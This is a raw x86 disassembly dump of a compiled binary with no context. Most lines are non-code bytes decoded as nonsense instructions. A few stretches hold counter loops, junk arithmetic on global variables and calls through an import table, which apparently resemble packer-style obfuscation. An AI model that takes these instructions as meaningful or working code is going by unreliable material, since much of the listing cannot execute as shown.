  404849:	add    BYTE PTR [ecx],bh
  40484b:	fisttp QWORD PTR [esi+0x7f652044]
  404851:	pop    DWORD PTR ds:[edx]
  404854:	shl    DWORD PTR [esi-0x22baacfd],cl
  40485a:	mov    BYTE PTR [ecx],0xdb
  40485d:	pop    esp
  40485e:	rcl    DWORD PTR [ecx],1
  404860:	jns    0x404800
  404862:	mov    dh,0x43
  404864:	daa    
  404865:	add    eax,0x12216723
  40486a:	fstp   TBYTE PTR [esi]
  40486c:	dec    edi
  40486d:	loopne 0x40483c
  40486f:	xchg   esp,eax
  404870:	add    DWORD PTR [ebp-0x40],esi
  404873:	push   esi
  404874:	sbb    ah,dh
  404876:	jmp    DWORD PTR [edi]
  404878:	mov    esp,0x5724e146
  40487d:	or     DWORD PTR [esi-0x4b93528e],ebx
  404883:	loopne 0x4048fd
  404885:	lds    edx,FWORD PTR [ebx+eax*2]
  404888:	inc    eax
  404889:	jl     0x404873
  40488b:	(bad)  
  40488c:	pop    ss
  40488d:	sbb    DWORD PTR [esi-0x32],esi
  404890:	fwait
  404891:	lds    ebx,FWORD PTR ds:0xfa272f
  404897:	mov    esp,0x54430d55
  40489c:	in     al,dx
  40489d:	gs scas al,BYTE PTR es:[edi]
  40489f:	ja     0x404900
  4048a1:	or     edi,ebp
  4048a3:	cmc    
  4048a4:	mov    ch,0x69
  4048a6:	stc    
  4048a7:	mov    ecx,0x248cbb43
  4048ac:	cmp    eax,0xd3279fd7
  4048b1:	adc    ch,BYTE PTR [ebp+0x4e239299]
  4048b7:	adc    eax,0x3734b434
  4048bc:	fdivr  QWORD PTR [eax]
  4048be:	inc    DWORD PTR [eax+0x41]
  4048c1:	mov    edi,0xf5a35357
  4048c6:	mov    ah,0x2b
  4048c8:	xor    BYTE PTR [eax],dh
  4048ca:	dec    ecx
  4048cb:	popf   
  4048cc:	out    0xca,al
  4048ce:	xchg   esp,eax
  4048cf:	sub    cl,BYTE PTR [edi+0x40]
  4048d2:	push   esi
  4048d3:	repz xchg esi,eax
  4048d5:	mov    edx,0x5d3d881b
  4048da:	les    esi,FWORD PTR [esi]
  4048dc:	(bad)  
  4048dd:	loopne 0x4048f1
  4048df:	inc    esi
  4048e0:	jecxz  0x4048f4
  4048e2:	retf   
  4048e3:	xor    esi,DWORD PTR [esi-0x43]
  4048e6:	loop   0x4048e9
  4048e8:	mov    ebx,0xf171b7c9
  4048ed:	fnsave [esi]
  4048ef:	push   ss
  4048f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048f1:	mov    ds:0x4c5261e9,al
  4048f6:	mov    dh,0x7e
  4048f8:	pusha  
  4048f9:	lds    ecx,FWORD PTR [ecx]
  4048fb:	(bad)  
  4048fc:	jns    0x4048fc
  4048fe:	and    al,0x5a
  404900:	jle    0x404897
  404902:	outs   dx,BYTE PTR ds:[esi]
  404903:	dec    edi
  404904:	hlt    
  404905:	jp     0x4048fb
  404907:	xchg   ebx,eax
  404908:	mov    ch,0xe4
  40490a:	lock mov esi,0xc83a7bd1
  404910:	sbb    bl,BYTE PTR [ebx]
  404912:	jle    0x4048db
  404914:	jge    0x4048db
  404916:	cmp    al,bh
  404918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404919:	jmp    0x40498c
  40491b:	mov    esi,0x983059e6
  404920:	dec    edx
  404921:	adc    BYTE PTR [ecx-0x23ba38e0],0xd8
  404928:	test   DWORD PTR [eax+edi*8-0x7e0bba75],ebx
  40492f:	sbb    eax,0x417e59
  404934:	push   ecx
  404935:	jle    0x404978
  404937:	add    BYTE PTR [ebx],dh
  404939:	mov    BYTE PTR [ecx+0x41abde2d],0x0
  404940:	retf   
  404941:	xor    eax,0x74e90042
  404946:	add    DWORD PTR [eax],eax
  404948:	add    ch,bl
  40494a:	adc    ebx,DWORD PTR [ecx+0x557959e1]
  404950:	and    eax,esi
  404952:	scas   al,BYTE PTR es:[edi]
  404953:	pop    ss
  404954:	stos   DWORD PTR es:[di],eax
  404956:	(bad)  
  404957:	stc    
  404958:	add    ebx,edx
  40495a:	jg     0x4049da
  40495c:	jle    0x404938
  40495e:	jg     0x4049de
  404960:	jle    0x404914
  404962:	pop    edi
  404963:	test   eax,0x27478fbd
  404968:	mov    ah,0x19
  40496a:	lea    esi,[ecx-0x7]
  40496d:	add    eax,0xb814c405
  404972:	push   ss
  404973:	xlat   BYTE PTR ds:[ebx]
  404974:	pop    ss
  404975:	fwait
  404976:	or     al,0xdf
  404978:	mov    edi,0xbb7de10a
  40497d:	shl    DWORD PTR [esi],cl
  40497f:	retf   
  404980:	call   0x976e:0x10c005c5
  404987:	(bad)  
  404988:	iret   
  404989:	ficom  DWORD PTR [ebx]
  40498b:	and    BYTE PTR [esi-0x766be80b],ch
  404991:	aas    
  404992:	test   al,0x2a
  404994:	sub    al,0x0
  404996:	push   es
  404997:	push   cs
  404998:	in     al,0xb5
  40499a:	loopne 0x404928
  40499c:	fwait
  40499d:	sub    edx,esp
  40499f:	inc    esp
  4049a0:	es push edx
  4049a2:	push   0x1010784b
  4049a7:	ins    BYTE PTR es:[edi],dx
  4049a8:	inc    esi
  4049a9:	mov    eax,0x7cf26fee
  4049ae:	push   cs
  4049af:	and    eax,0xd6f0998b
  4049b4:	clc    
  4049b5:	int3   
  4049b6:	mov    ds,WORD PTR [edi]
  4049b8:	xchg   al,bh
  4049ba:	mov    dl,0xfa
  4049bc:	mov    eax,ds:0x41fe7e24
  4049c1:	aad    0xd3
  4049c3:	adc    dl,BYTE PTR [ebp+0x64]
  4049c6:	(bad)  
  4049c7:	ja     0x404a27
  4049c9:	mov    edx,0xa57a2e7
  4049ce:	dec    ah
  4049d0:	mov    ch,0xe
  4049d2:	dec    ebp
  4049d3:	xchg   BYTE PTR [ebx-0x1c],bh
  4049d6:	mov    ebx,0xe0ace312
  4049db:	inc    edi
  4049dc:	mov    eax,ds:0xb556b115
  4049e1:	pushf  
  4049e2:	sahf   
  4049e3:	jmp    0x4049c4
  4049e5:	push   0xa755b4e6
  4049ea:	jmp    0x6fa:0x6a45bf1f
  4049f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049f2:	leave  
  4049f3:	sbb    edx,ecx
  4049f5:	pop    es
  4049f6:	clc    
  4049f7:	(bad)  
  4049f8:	add    esi,esp
  4049fa:	stc    
  4049fb:	cdq    
  4049fc:	cld    
  4049fd:	scas   eax,DWORD PTR es:[edi]
  4049fe:	icebp  
  4049ff:	cmp    bh,BYTE PTR [edi-0x20]
  404a02:	inc    esp
  404a03:	jbe    0x4049d6
  404a05:	into   
  404a06:	pop    ss
  404a07:	fisttp DWORD PTR [ecx+eiz*2+0x57069ced]
  404a0e:	dec    esi
  404a0f:	cmp    al,0x13
  404a11:	mov    BYTE PTR [esi-0x77],dh
  404a14:	xor    DWORD PTR [ecx-0x112ff916],ecx
  404a1a:	xchg   BYTE PTR [eax+0x36],cl
  404a1d:	mov    cl,0x52
  404a1f:	fidivr DWORD PTR [ecx]
  404a21:	loop   0x4049d0
  404a23:	std    
  404a24:	imul   esp,DWORD PTR [edx-0x7c],0x21
  404a28:	lods   eax,DWORD PTR ds:[esi]
  404a29:	xor    eax,0x91d1f960
  404a2e:	int3   
  404a2f:	iret   
  404a30:	retf   
  404a31:	mov    ch,0xfd
  404a33:	dec    edx
  404a34:	sbb    DWORD PTR ds:0xf4c6f584,ebp
  404a3a:	adc    ah,BYTE PTR [esp+eiz*4+0x173e9a27]
  404a41:	fistp  WORD PTR [ecx*2-0x5829a1f7]
  404a48:	addr16 xchg edx,eax
  404a4a:	push   DWORD PTR [ebp+eax*4-0x60415a7b]
  404a51:	aaa    
  404a52:	sub    BYTE PTR [edi],al
  404a54:	cmp    eax,DWORD PTR [esi-0x61]
  404a57:	jle    0x404abc
  404a59:	aaa    
  404a5a:	iret   
  404a5b:	int3   
  404a5c:	jmp    0x1daaf73b
  404a61:	test   BYTE PTR [ebx+eiz*4+0x41c21490],cl
  404a68:	cmp    BYTE PTR ds:0x23240e37,ah
  404a6e:	das    
  404a6f:	fbld   TBYTE PTR [eax+ebp*2]
  404a72:	fs in  eax,dx
  404a74:	xchg   ebx,esp
  404a76:	jb     0x404ad7
  404a78:	(bad)  
  404a79:	outs   dx,DWORD PTR ds:[esi]
  404a7a:	fcom   st(2)
  404a7c:	scas   eax,DWORD PTR es:[edi]
  404a7d:	fucom  st(3)
  404a7f:	xor    al,bh
  404a81:	jmp    0xaf4fccc4
  404a86:	ret    
  404a87:	sub    ecx,DWORD PTR [edx-0x7e]
  404a8a:	or     BYTE PTR [edx+edx*8-0x75ffe275],0x1
  404a92:	inc    ecx
  404a93:	hlt    
  404a94:	nop
  404a95:	xor    eax,0x5c768d84
  404a9a:	or     al,0x33
  404a9c:	xchg   ah,bl
  404a9e:	sahf   
  404a9f:	das    
  404aa0:	sbb    ebx,esp
  404aa2:	sub    DWORD PTR [ecx-0x18167309],edi
  404aa8:	or     al,0x82
  404aaa:	mov    eax,0x3befc1fd
  404aaf:	xchg   edx,eax
  404ab0:	xchg   ebx,eax
  404ab1:	int3   
  404ab2:	add    dl,ch
  404ab4:	xor    DWORD PTR [ecx-0x8],ebx
  404ab7:	popa   
  404ab8:	clc    
  404ab9:	xchg   ecx,eax
  404aba:	rcl    bh,1
  404abc:	pop    ds
  404abd:	add    eax,edi
  404abf:	mov    DWORD PTR [ebp-0x18],eax
  404ac2:	and    DWORD PTR ds:0x4235cb,0x0
  404acc:	jmp    0x404adc
  404ad1:	mov    eax,ds:0x4235cb
  404ad6:	inc    eax
  404ad7:	mov    ds:0x4235cb,eax
  404adc:	cmp    DWORD PTR ds:0x4235cb,0x1e
  404ae3:	jae    0x404b28
  404ae9:	cmp    DWORD PTR ds:0x4235cb,0x6
  404af0:	jne    0x404b01
  404af6:	push   0x41ae97
  404afb:	call   DWORD PTR ds:0x40d1c4
  404b01:	cmp    DWORD PTR ds:0x4235cb,0x5
  404b08:	jne    0x404b19
  404b0e:	mov    eax,ds:0x4235cb
  404b13:	inc    eax
  404b14:	mov    ds:0x4235cb,eax
  404b19:	jmp    0x404ad1
  404b1e:	sub    DWORD PTR ds:0x415111,0xc33
  404b28:	mov    DWORD PTR [ebp-0x1c],0xf89c853f
  404b2f:	mov    BYTE PTR [ebp-0x1],0x57
  404b33:	sub    DWORD PTR ds:0x417e59,edi
  404b39:	mov    eax,DWORD PTR [ebp-0xc]
  404b3c:	xor    eax,esi
  404b3e:	and    DWORD PTR ds:0x415115,0x5145
  404b48:	add    eax,edi
  404b4a:	mov    DWORD PTR [ebp-0x18],eax
  404b4d:	mov    eax,DWORD PTR [ebp-0x24]
  404b50:	xor    eax,esi
  404b52:	adc    DWORD PTR ds:0x41abde,0x3f71
  404b5c:	add    eax,edi
  404b5e:	and    DWORD PTR ds:0x4235cf,0x352e
  404b68:	push   eax
  404b69:	dec    eax
  404b6a:	mov    eax,DWORD PTR [ebp-0x28]
  404b6d:	xor    eax,esi
  404b6f:	and    DWORD PTR ds:0x4235c3,0x41abce
  404b79:	add    eax,edi
  404b7b:	xor    DWORD PTR ds:0x41abda,0x41237c
  404b85:	push   eax
  404b86:	and    DWORD PTR ds:0x4235cf,0x41abe2
  404b90:	mov    eax,DWORD PTR [ebp-0x1c]
  404b93:	jmp    0x404d0c
  404b98:	push   0xffffff9c
  404b9a:	mov    ds:0x7b617853,al
  404b9f:	xchg   ebp,eax
  404ba0:	push   ebx
  404ba1:	mov    DWORD PTR [ecx+0x3f],esp
  404ba4:	sub    BYTE PTR [eax],dl
  404ba6:	push   ebp
  404ba7:	shl    DWORD PTR [esi-0x25818184],cl
  404bad:	jg     0x404c2d
  404baf:	jle    0x404b80
  404bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bb2:	add    DWORD PTR [ebp-0xd],ebp
  404bb5:	adc    bh,BYTE PTR [esi]
  404bb7:	cli    
  404bb8:	pusha  
  404bb9:	adc    dh,bh
  404bbb:	loop   0x404b89
  404bbd:	inc    esi
  404bbe:	xchg   ebx,eax
  404bbf:	jmp    0x404b8e
  404bc1:	pop    ebx
  404bc2:	or     al,0xad
  404bc4:	xchg   ebp,eax
  404bc5:	or     bh,0x1e
  404bc8:	push   cs
  404bc9:	outs   dx,DWORD PTR ds:[esi]
  404bca:	dec    eax
  404bcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bcc:	in     eax,dx
  404bcd:	add    BYTE PTR ds:0xf2047268,ch
  404bd3:	mov    dh,BYTE PTR [eax]
  404bd5:	pop    ss
  404bd6:	gs or  al,0x47
  404bd9:	idiv   BYTE PTR [edx-0x74d97f86]
  404bdf:	xchg   ebp,eax
  404be0:	popa   
  404be1:	and    bl,BYTE PTR [edx]
  404be3:	jo     0x404b67
  404be5:	cmp    ebx,DWORD PTR [esi]
  404be7:	cwde   
  404be8:	cmc    
  404be9:	xchg   ecx,eax
  404bea:	stc    
  404beb:	cmc    
  404bec:	(bad)  
  404bed:	div    BYTE PTR ds:0x7a95d905
  404bf3:	adc    DWORD PTR [esp+ecx*1],eax
  404bf6:	pop    ds
  404bf7:	test   al,0x8b
  404bf9:	inc    ebx
  404bfa:	adc    BYTE PTR [ebx+edx*2],cl
  404bfd:	inc    ecx
  404bfe:	push   cs
  404bff:	adc    al,0xb8
  404c01:	push   eax
  404c02:	pop    eax
  404c03:	fistp  DWORD PTR [edx]
  404c05:	pop    es
  404c06:	call   0xcf20058
  404c0b:	push   edx
  404c0c:	mov    bh,0x57
  404c0e:	and    ebx,edi
  404c10:	sbb    al,0x85
  404c12:	fdiv   DWORD PTR ds:0x2302ec6d
  404c18:	push   cs
  404c19:	or     eax,0x7eb9fafb
  404c1e:	arpl   WORD PTR [edi-0x4de67058],cx
  404c24:	out    dx,al
  404c25:	pop    ss
  404c26:	pop    edx
  404c27:	loop   0x404c26
  404c29:	hlt    
  404c2a:	xchg   ecx,eax
  404c2b:	das    
  404c2c:	mov    DWORD PTR [ecx-0x80],edi
  404c2f:	jmp    0x404c5e
  404c31:	retf   
  404c32:	out    dx,al
  404c33:	sub    DWORD PTR ds:0x7762c5b8,ecx
  404c39:	jnp    0x404c7e
  404c3b:	pusha  
  404c3c:	lods   eax,DWORD PTR ds:[esi]
  404c3d:	mov    ebp,ecx
  404c3f:	aam    0xfc
  404c41:	jne    0x404c7a
  404c43:	and    ebp,edx
  404c45:	adc    BYTE PTR [esi-0x47e90e41],ah
  404c4b:	jmp    0x5bab:0xdb33848f
  404c52:	call   0x163a:0x154e5f95
  404c59:	and    DWORD PTR [ebx+eiz*4-0x18a878c5],0x1fb92a7a
  404c64:	jle    0x404c40
  404c66:	rcr    BYTE PTR [ebp+0x72],1
  404c69:	cmp    al,BYTE PTR [ebx+ecx*2]
  404c6c:	xor    al,0x72
  404c6e:	adc    al,0x72
  404c70:	mov    ah,0xab
  404c72:	or     al,ch
  404c74:	aas    
  404c75:	xchg   BYTE PTR [eax+0x7bd4d850],bl
  404c7b:	mov    edi,0x13a3b016
  404c80:	retf   0x5e9
  404c83:	fdiv   st,st(7)
  404c85:	xchg   dh,bl
  404c87:	shl    al,0x60
  404c8a:	lds    edi,FWORD PTR [edx]
  404c8c:	adc    BYTE PTR [ecx],ch
  404c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c8f:	or     DWORD PTR [ebp+eiz*2+0x72],ebx
  404c93:	clc    
  404c94:	das    
  404c95:	jmp    0x7128:0x8772fa20
  404c9c:	cdq    
  404c9d:	sub    al,0xa7
  404c9f:	sbb    DWORD PTR [ecx-0x30],ebx
  404ca2:	push   ebx
  404ca3:	xor    BYTE PTR [eax-0x67],al
  404ca6:	xlat   BYTE PTR ds:[ebx]
  404ca7:	sti    
  404ca8:	mov    ah,0x38
  404caa:	icebp  
  404cab:	push   cs
  404cac:	and    dl,dh
  404cae:	cmp    eax,0x84e4c271
  404cb3:	pop    edx
  404cb4:	push   edi
  404cb5:	pop    ebp
  404cb6:	xor    ebx,DWORD PTR [ebp+0x553060e8]
  404cbc:	pop    esp
  404cbd:	sub    al,BYTE PTR ds:0x71cf46d2
  404cc3:	test   eax,0x29189bae
  404cc8:	pop    esp
  404cc9:	in     eax,dx
  404cca:	outs   dx,BYTE PTR ds:[esi]
  404ccb:	add    edx,eax
  404ccd:	outs   dx,DWORD PTR ds:[esi]
  404cce:	fdivr  DWORD PTR [ecx-0x27]
  404cd1:	loop   0x404d45
  404cd3:	loop   0x404cf4
  404cd5:	lahf   
  404cd6:	test   DWORD PTR [ebp-0x1583478d],edi
  404cdc:	or     DWORD PTR [ecx+eiz*2-0x6d],edi
  404ce0:	out    0x67,al
  404ce2:	inc    DWORD PTR [eax]
  404ce4:	jno    0x404d17
  404ce6:	xlat   BYTE PTR ds:[ebx]
  404ce7:	sub    bh,BYTE PTR [esi-0x6b]
  404cea:	sbb    BYTE PTR [ebx],ah
  404cec:	lods   eax,DWORD PTR ds:[esi]
  404ced:	fidiv  WORD PTR [ebx+0x6]
  404cf0:	rcl    eax,1
  404cf2:	xor    DWORD PTR [ebx-0x68],0xbf3422f5
  404cf9:	inc    edx
  404cfa:	cmp    ebp,DWORD PTR ds:0xaaf38742
  404d00:	stos   BYTE PTR es:[edi],al
  404d01:	push   esp
  404d02:	mov    WORD PTR [eax-0x742dda50],fs
  404d08:	pop    ebx
  404d09:	xchg   edi,eax
  404d0a:	mov    bl,0xfa
  404d0c:	xor    eax,esi
  404d0e:	neg    DWORD PTR ds:0x415105
  404d14:	add    eax,edi
  404d16:	xor    DWORD PTR ds:0x412364,0x39b1
  404d20:	push   eax
  404d21:	lea    eax,[ebp-0x78]
  404d24:	push   eax
  404d25:	mov    DWORD PTR ds:0x41237c,0x6752
  404d2f:	push   DWORD PTR [ebp-0xc]
  404d32:	sub    DWORD PTR ds:0x415111,0x1b2b
  404d3c:	push   DWORD PTR [ebp-0x14]
  404d3f:	sub    DWORD PTR ds:0x4235c7,0x412364
  404d49:	call   0x409363
  404d4e:	inc    DWORD PTR ds:0x415119
  404d54:	test   eax,eax
  404d56:	mov    DWORD PTR ds:0x4235c7,0x71ec
  404d60:	je     0x404de0
  404d66:	sub    DWORD PTR ds:0x417e59,0x4235db
  404d70:	lea    eax,[ebp-0x78]
  404d73:	neg    DWORD PTR ds:0x4235cf
  404d79:	push   eax
  404d7a:	add    eax,DWORD PTR ds:0x4235db
  404d80:	mov    eax,DWORD PTR [ebp-0x14]
  404d83:	and    DWORD PTR ds:0x417e59,0xd95
  404d8d:	xor    eax,esi
  404d8f:	add    eax,edi
  404d91:	and    DWORD PTR ds:0x417e3d,0x71b6
  404d9b:	push   eax
  404d9c:	mov    eax,DWORD PTR [ebp-0x10]
  404d9f:	add    eax,0xaa
  404da4:	push   eax
  404da5:	and    DWORD PTR ds:0x41abd2,0x17f4
  404daf:	mov    eax,DWORD PTR [ebp-0x10]
  404db2:	sub    DWORD PTR ds:0x417e55,0x41236c
  404dbc:	mov    eax,DWORD PTR [eax+0x198]
  404dc2:	push   DWORD PTR [eax]
  404dc4:	add    DWORD PTR ds:0x417e55,0x417e3d
  404dce:	call   0x40ae4d
  404dd3:	mov    DWORD PTR ds:0x41abd6,0x35a
  404ddd:	mov    DWORD PTR [ebp-0x8],eax
  404de0:	mov    DWORD PTR ds:0x412368,0x764e
  404dea:	cmp    DWORD PTR [ebp-0x8],0x0
  404dee:	not    DWORD PTR ds:0x412364
  404df4:	lea    eax,[ebp+0x4]
  404df7:	mov    DWORD PTR [ebp-0x20],eax
  404dfa:	je     0x405842
  404e00:	lea    eax,[ebp-0x18]
  404e03:	jmp    0x404f7c
  404e08:	ja     0x404d8f
  404e0a:	(bad)  
  404e0b:	je     0x404d9a
  404e0d:	je     0x404d94
  404e0f:	test   DWORD PTR [esi],edi
  404e11:	push   ebx
  404e12:	outs   dx,DWORD PTR ds:[esi]
  404e13:	jne    0x404df4
  404e15:	or     DWORD PTR [edx],ecx
  404e17:	sahf   
  404e18:	add    dh,BYTE PTR [edx+0x7e]
  404e1b:	jle    0x404df7
  404e1d:	jg     0x404e9d
  404e1f:	jle    0x404dbb
  404e21:	mov    cl,0xd6
  404e23:	addr16 aad 0x63
  404e26:	push   ebp
  404e27:	add    DWORD PTR [edi-0x35],esi
  404e2a:	in     al,dx
  404e2b:	dec    edx
  404e2c:	sub    al,0x77
  404e2e:	jl     0x404dd7
  404e30:	retf   0x8f25
  404e33:	xchg   esp,eax
  404e34:	cmp    esp,ebp
  404e36:	imul   ecx,DWORD PTR [ebp-0x80],0x78
  404e3a:	sub    edx,DWORD PTR [ebx]
  404e3c:	sbb    cl,BYTE PTR [eax-0x38]
  404e3f:	xor    BYTE PTR [ecx+0x7c],ch
  404e42:	jbe    0x404e3d
  404e44:	mov    al,ds:0x7e266192
  404e49:	in     al,0x25
  404e4b:	shl    DWORD PTR [ebp+0x49],1
  404e4e:	cwde   
  404e4f:	jmp    0x145c6db8
  404e54:	imul   ecx,DWORD PTR [ebx],0xe8cf9807
  404e5a:	inc    ecx
  404e5b:	imul   esp,ecx,0xffffffd8
  404e5e:	mov    bl,0xe9
  404e60:	into   
  404e61:	inc    ebx
  404e62:	xchg   BYTE PTR [edx+edx*4+0x36],bh
  404e66:	call   0xfb1d:0xd2dc841
  404e6d:	jl     0x404e9a
  404e6f:	pop    ebx
  404e70:	jno    0x404e6f
  404e72:	jge    0x404ee5
  404e74:	mov    ebx,0x6165698e
  404e79:	dec    eax
  404e7a:	xchg   ebp,eax
  404e7b:	call   FWORD PTR [edx]
  404e7d:	and    al,0xdc
  404e7f:	inc    edi
  404e80:	pusha  
  404e81:	outs   dx,BYTE PTR ds:[esi]
  404e82:	add    DWORD PTR [edx-0x6b],0x3e
  404e86:	ss mov edi,0xfdb20423
  404e8c:	jne    0x404ec8
  404e8e:	xlat   BYTE PTR ds:[ebx]
  404e8f:	mov    al,ds:0x9b37d7b0
  404e94:	mov    edi,0xd843cd4b
  404e99:	and    al,0xd1
  404e9b:	and    ch,BYTE PTR [edx*1+0x5e5a2f29]
  404ea2:	loopne 0x404e71
  404ea4:	outs   dx,BYTE PTR ds:[esi]
  404ea5:	inc    edi
  404ea6:	in     eax,dx
  404ea7:	adc    DWORD PTR gs:[ebx+ebp*2+0x117698e6],ebx
  404eaf:	jo     0x404f15
  404eb1:	cmp    dl,BYTE PTR ds:0x9d809c19
  404eb7:	and    BYTE PTR [ebp-0x33],bh
  404eba:	nop    DWORD PTR [edx-0x25]
  404ebe:	mov    bl,0x7c
  404ec0:	ret    
  404ec1:	mov    ds:0x71869e4a,eax
  404ec6:	or     DWORD PTR [esi],edi
  404ec8:	hlt    
  404ec9:	out    0xc7,al
  404ecb:	cmp    eax,0x48f6f211
  404ed0:	adc    eax,0xa08e8a2e
  404ed5:	mov    edx,0xb97b3b5c
  404eda:	dec    ecx
  404edb:	fstp   st(4)
  404edd:	notrack call DWORD PTR ds:0xabd11c5c
  404ee4:	mov    dl,BYTE PTR [edx+0x31]
  404ee7:	sbb    BYTE PTR [esi],bh
  404ee9:	jno    0x404ec4
  404eeb:	or     eax,DWORD PTR [eax+edx*8-0x74]
  404eef:	shl    DWORD PTR [edx+ebx*8],1
  404ef2:	cmp    ch,BYTE PTR [ecx+0x2c]
  404ef5:	push   cs
  404ef6:	js     0x404f2e
  404ef8:	ror    BYTE PTR [esi+0x5b],cl
  404efb:	and    ecx,DWORD PTR [edi+0x7a]
  404efe:	lock fcom DWORD PTR [edi+edi*1+0x5f]
  404f03:	inc    esp
  404f04:	and    esi,DWORD PTR [edi-0x4d8ac675]
  404f0a:	push   ds
  404f0b:	(bad)  
  404f0c:	mov    ebp,0xbaf57aae
  404f11:	std    
  404f12:	inc    edi
  404f13:	jmp    0x6413:0xc0a6a71b
  404f1a:	mov    eax,0x5a40ab98
  404f1f:	push   ecx
  404f20:	push   0x5f
  404f22:	jmp    0x3ad76721
  404f27:	sub    al,0x1d
  404f29:	jo     0x404ead
  404f2b:	jmp    0xbcf3cf4d
  404f30:	mov    bh,0x7c
  404f32:	mov    ds:0x8db1b19,al
  404f37:	dec    edi
  404f38:	pop    esp
  404f39:	push   esp
  404f3a:	in     eax,dx
  404f3b:	mov    cr6,eax
  404f3e:	psubusw mm7,QWORD PTR [ebx+0x4877e4de]
  404f45:	xor    edx,ebp
  404f47:	or     BYTE PTR [ebx],ch
  404f49:	xchg   ebp,eax
  404f4a:	scas   al,BYTE PTR es:[edi]
  404f4b:	push   ebx
  404f4c:	leave  
  404f4d:	push   esp
  404f4e:	lahf   
  404f4f:	mov    ds:0xd025cc80,eax
  404f54:	addr16 nop
  404f56:	cmp    BYTE PTR [edi],bl
  404f58:	and    eax,0x2bae5dbe
  404f5d:	in     al,dx
  404f5e:	call   0xe379:0x1c807e76
  404f65:	and    eax,0x77c768c8
  404f6a:	test   eax,0x33221ea7
  404f6f:	hlt    
  404f70:	sub    eax,0x5af8325a
  404f75:	sub    eax,ebp
  404f77:	aas    
  404f78:	push   es
  404f79:	cmp    ebp,ecx
  404f7b:	repz push eax
  404f7d:	and    DWORD PTR ds:0x4235bf,0x0
  404f87:	jmp    0x404f97
  404f8c:	mov    eax,ds:0x4235bf
  404f91:	inc    eax
  404f92:	mov    ds:0x4235bf,eax
  404f97:	cmp    DWORD PTR ds:0x4235bf,0x1e
  404f9e:	jae    0x404fc0
  404fa4:	cmp    DWORD PTR ds:0x4235bf,0x22
  404fab:	jne    0x404fba
  404fb1:	push   DWORD PTR [ebp-0x28]
  404fb4:	call   DWORD PTR ds:0x40d298
  404fba:	jmp    0x404f8c
  404fbf:	inc    eax
  404fc0:	mov    eax,DWORD PTR [ebp-0x2c]
  404fc3:	adc    DWORD PTR ds:0x412354,0x412370
  404fcd:	xor    eax,esi
  404fcf:	add    eax,edi
  404fd1:	and    DWORD PTR ds:0x415115,0x3c83
  404fdb:	jmp    0x405154
  404fe0:	adc    al,0x10
  404fe2:	imul   DWORD PTR [edx]
  404fe4:	mov    ebp,DWORD PTR [ecx+0x1f8510a9]
  404fea:	and    DWORD PTR [edx+0x1eec18b8],esi
  404ff0:	out    dx,al
  404ff1:	jae    0x405071
  404ff3:	jle    0x404fcf
  404ff5:	jg     0x405075
  404ff7:	jle    0x405067
  404ff9:	or     eax,0x7e06f2f7
  404ffe:	sbb    dl,BYTE PTR [ebx]
  405000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405001:	xchg   ecx,eax
  405002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405003:	or     eax,0x5ae0007b
  405008:	jg     0x404fb5
  40500a:	outs   dx,DWORD PTR ds:[esi]
  40500b:	xchg   edi,eax
  40500c:	ja     0x404fc0
  40500e:	xchg   edi,eax
  40500f:	xor    DWORD PTR [edi-0x55],ecx
  405012:	mov    fs,WORD PTR [ebx-0x8]
  405015:	aaa    
  405016:	inc    eax
  405017:	and    ch,BYTE PTR [esi-0x7b59eb85]
  40501d:	mov    ch,0x4f
  40501f:	outs   dx,DWORD PTR ds:[esi]
  405020:	push   ss
  405021:	fld    QWORD PTR [ebx-0x1d348ecc]
  405027:	fwait
  405028:	xchg   ebp,eax
  405029:	shr    BYTE PTR [eax+edi*4+0x41],cl
  40502d:	pop    ss
  40502e:	inc    ecx
  40502f:	shl    DWORD PTR [edi-0x36],1
  405032:	inc    ecx
  405033:	outs   dx,DWORD PTR ds:[esi]
  405034:	inc    edi
  405035:	push   ebp
  405036:	xor    eax,0xfa0250b9
  40503b:	cmp    al,0x4d
  40503d:	clc    
  40503e:	jb     0x40507a
  405040:	cdq    
  405041:	or     eax,0x5f900f1f
  405046:	cdq    
  405047:	add    eax,0x53821edd
  40504c:	aaa    
  40504d:	add    al,0x1f
  40504f:	outs   dx,BYTE PTR ds:[esi]
  405050:	adc    eax,0x30d781c0
  405055:	xor    bh,BYTE PTR [edi]
  405057:	dec    esp
  405058:	scas   eax,DWORD PTR es:[edi]
  405059:	rcr    BYTE PTR [ebx+0x3f],1
  40505c:	and    eax,DWORD PTR [ecx-0x20]
  40505f:	inc    eax
  405060:	fild   WORD PTR [esi-0xf13eca0]
  405066:	mov    dh,0xd
  405068:	xor    DWORD PTR [eax],esi
  40506a:	cwde   
  40506b:	sti    
  40506c:	popa   
  40506d:	inc    BYTE PTR [ebp-0x7d]
  405070:	enter  0x6fa2,0x2c
  405074:	xchg   ebp,eax
  405075:	inc    esi
  405076:	push   edi
  405077:	adc    edi,DWORD PTR [eax-0x6b2de68b]
  40507d:	push   ss
  40507e:	xor    al,BYTE PTR [edi+edi*8]
  405081:	pushf  
  405082:	pop    es
  405083:	fist   WORD PTR [ecx+0x216eb244]
  405089:	add    BYTE PTR ds:0xb97fdec7,0x12
  405090:	pop    eax
  405091:	test   DWORD PTR [edx],ebx
  405093:	imul   esp,DWORD PTR [ebx+eax*1],0xffffffc7
  405097:	sahf   
  405098:	xchg   edx,eax
  405099:	mov    eax,ds:0x9a355e8
  40509e:	sbb    al,BYTE PTR [ebp-0x577c91ef]
  4050a4:	std    
  4050a5:	sar    BYTE PTR [esi+0x24],1
  4050a8:	mov    esp,0xbd9da152
  4050ad:	sar    DWORD PTR [esi+0x73],1
  4050b0:	bswap  eax
  4050b2:	pop    esp
  4050b3:	xor    ah,cl
  4050b5:	mov    BYTE PTR [eax+0xfe38b38],ah
  4050bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050bc:	(bad)  
  4050bd:	mov    esi,0xc1c8e517
  4050c2:	add    al,0x8c
  4050c4:	jno    0x4050f5
  4050c6:	or     esp,ebp
  4050c8:	sti    
  4050c9:	gs sub dl,bh
  4050cc:	lea    eax,[ebx+0x6a28e225]
  4050d2:	jp     0x40505c
  4050d4:	iret   
